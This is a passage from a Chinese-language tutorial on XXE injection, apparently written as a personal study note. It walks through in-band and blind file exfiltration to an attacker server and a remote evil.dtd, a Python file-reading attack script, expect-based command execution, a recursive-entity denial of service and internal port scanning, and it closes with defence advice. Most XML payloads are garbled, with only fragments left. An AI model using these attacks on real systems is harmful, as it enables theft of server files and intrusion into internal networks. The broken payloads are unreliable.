示例代码
构造payload
    ]>
    &file;
读取文件，需URL编码后执行。  
通过 **构造外部实体payload** ，在 xml 中 `&file ;` 变成了外部文件`qwzf.txt`中内容，导致敏感信息泄露。  
**靶场练习**  
使用一下靶场练习回显读取文件和无回显读取文件：[xxe-lab](https://github.com/c0ny1/xxe-lab)  
输入，抓包发包，发现通过XML传输数据  
php源码
    loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
        $creds = simplexml_import_dom($dom);
        $username = $creds->username;
        $password = $creds->password;
        if($username == $USERNAME && $password == $PASSWORD){
            $result = sprintf("%d%s",1,$username);
        }else{
            $result = sprintf("%d%s",0,$username);
        }   
    }catch(Exception $e){
        $result = sprintf("%d%s",3,$e->getMessage());
    }
    header('Content-Type: text/html; charset=utf-8');
    echo $result;
    ?>
  1. 有回显
构造payload
    ]>
      &file;
      hack
当然，也可以使用`php://filter`协议读取qwzf.txt文件内容(也可以读取其他类型的文件，如：php文件)
    php://filter/read=convert.base64-encode/resource=
  1. 无回显
修改源码，禁掉输出代码和报错信息，改成无回显。  
遇到无回显，可以通过`Blind
XXE`方法加上外带数据通道来提取数据，先使用`php://filter`协议获取目标文件的内容，然后将内容以`http`请求发送到攻击服务器来读取数据。虽无法直接查看文件内容，但我们可以使用易受攻击的服务器作为代理，在外部网络上执行扫描以及代码。即，当无回显情况时，可以将数据发送到远程服务器(攻击服务器)。
这里我使用的攻击机ip为：`192.168.201.128`
构造payload
    %dtd;
    %send;
    ]>
远程服务器部署evil.dtd内容为:
    "> %payload;
%要进行实体编码`&#x25`  
进行XXE攻击后，服务器会把文件内容发送到攻击者服务器(这里是ubantu的apache日志记录)  
ubantu查看apache日志记录命令：
    tail -f /var/log/apache2/access.log
本地抓包也可以看到Base64编码后的文件内容  
_无回显攻击流程：_
  * 先调用`%dtd`，请求远程服务器(攻击服务器)上的`evil.dtd`。
  * 再调用 `evil.dtd`中的 `%file`。`%file` 获取受攻击的服务器上面的敏感文件，然后将 `%file` 的返回结果传到`%send` 。
  * 然后调用 `%send;` 把读取到的数据发送到远程服务器上。
这样就实现了外带数据的效果，解决 XXE 无回显的问题。
**使用并分析恶意脚本**  
xxe2.php
    name;
    ?>
读取文件.py
    #!/usr/bin/python
    # -*- coding:utf-8 -*-    import urllib2
    if __name__ == '__main__':
        print u'输入要访问的地址，如http://127.0.0.1/xml/xxe2.php'
        url = raw_input()
        count=1
        while count==1:
            print u'输入要读取的文件，如file:///etc/passwd'
            payload = raw_input()
            headers = {'Content-type': 'text/xml'}
            xml = ']>&xxe;'
            req = urllib2.Request(url = url,headers = headers, data = xml)
            res_data = urllib2.urlopen(req)
            res = res_data.read()
            print res
通过urllib2的request方法用POST方式向目标地址发送XML数据，返回的数据即为服务器相关文件内容。
##### 2、执行系统命令
在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。
    ]>
    &xxe;
通过XXE可以实现RCE的实例很少。
##### 3、拒绝服务攻击(Dos)
    ]>
    &lol9;
**原理** ：递归引用,lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10
次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol9 实体含有 10^8 个 “lol”
字符串,最后再引用lol9。
##### 4、探测内网端口与攻击内网网站
**探测内网端口**
    ]>
    &xxe;
3306端口开放  
3389端口未开放  
**攻击内网网站**
    ]>
    &xxe;
### 0x06 XXE漏洞防御
**1、使用开发语言提供的禁用外部实体的方法**  
php:
    libxml_disable_entity_loader(true);
java:
    DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
    dbf.setExpandEntityReferences(false);
Python:
    from lxml import etree
    xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
**2、过滤用户提交的XML数据**  
过滤关键字：`<\!DOCTYPE`和`<\!ENTITY`，或者`SYSTEM`和`PUBLIC`。  
**3、不允许XML中含有自己定义的DTD**
### 0x07 后记
总算把常见XML漏洞学完了，这里重点学习了XXE漏洞(XML外部实体注入)。整体来说，收获很大。
参考博客：  
[XML实体注入漏洞](https://www.cnblogs.com/xiaozi/p/5785165.html)  
[漏洞利用: XML外部实体（XXE）注入](https://bbs.ichunqiu.com/thread-44650-1-7.html)